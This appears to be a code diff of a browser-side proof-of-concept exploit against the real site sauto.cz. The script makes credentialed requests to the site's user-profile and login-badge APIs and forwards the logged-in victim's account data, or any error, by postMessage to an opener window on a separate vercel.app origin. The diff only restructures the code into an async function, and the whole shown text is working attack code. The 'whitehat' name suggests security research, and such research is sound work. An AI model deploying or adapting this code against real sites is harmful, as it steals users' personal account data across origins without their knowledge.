@@ -8,34 +8,38 @@ window.addEventListener(
     false,
 );
 
-axios
-    .get(
-        'https://www.sauto.cz/api/v1/users/self',
-        {
-            withCredentials: true,
-            credentials: "same-origin",
-        },
-    ).then((response) => {
-        window.opener.postMessage(response.data, 'https://whitehat-email-cz.vercel.app/')
-        window.close();
-    })
-    .catch(error => {
-        window.opener.postMessage(error, 'https://whitehat-email-cz.vercel.app/')
-        window.close();
-    });
+async function run()
+{
+    await axios
+        .get(
+            'https://www.sauto.cz/api/v1/users/self',
+            {
+                withCredentials: true,
+                credentials: "same-origin",
+            },
+        )
+        .then((response) => {
+            window.opener.postMessage(response.data, 'https://whitehat-email-cz.vercel.app/')
+        })
+        .catch(error => {
+            window.opener.postMessage(error, 'https://whitehat-email-cz.vercel.app/')
+        });
 
-axios
-    .get(
-        'https://login.sauto.cz/api/v1/user/badge?service=sauto',
-        {
-            withCredentials: true,
-            credentials: "same-origin",
-        },
-    ).then((response) => {
-        window.opener.postMessage(response.data, 'https://whitehat-email-cz.vercel.app/')
-        window.close();
-    })
-    .catch(error => {
-        window.opener.postMessage(error, 'https://whitehat-email-cz.vercel.app/')
-        window.close();
-    });
+    await axios
+        .get(
+            'https://login.sauto.cz/api/v1/user/badge?service=sauto',
+            {
+                withCredentials: true,
+                credentials: "same-origin",
+            },
+        )
+        .then((response) => {
+            window.opener.postMessage(response.data, 'https://whitehat-email-cz.vercel.app/')
+        })
+        .catch(error => {
+            window.opener.postMessage(error, 'https://whitehat-email-cz.vercel.app/')
+        });
+
+    window.close();
+}
+run().then(r => null);
